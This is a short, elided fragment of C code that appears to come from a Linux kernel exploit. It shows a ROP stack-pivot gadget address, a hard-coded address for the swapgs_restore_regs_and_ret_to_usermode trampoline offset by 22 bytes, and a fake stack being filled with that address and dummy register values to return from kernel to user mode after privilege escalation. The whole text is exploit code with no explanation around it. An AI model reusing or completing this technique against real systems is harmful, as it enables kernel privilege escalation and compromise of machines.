...
// 0xffffffff8196f56a : mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret
    ...
    uint64_t swapgs_restore_regs_and_ret_to_usermode = 0xffffffff81200f10 + 22;
    ...
    p_fake_stack[fake_sp++] = swapgs_restore_regs_and_ret_to_usermode;
    p_fake_stack[fake_sp++] = 0; // dummy rax
    p_fake_stack[fake_sp++] = 0; // dummy rdi
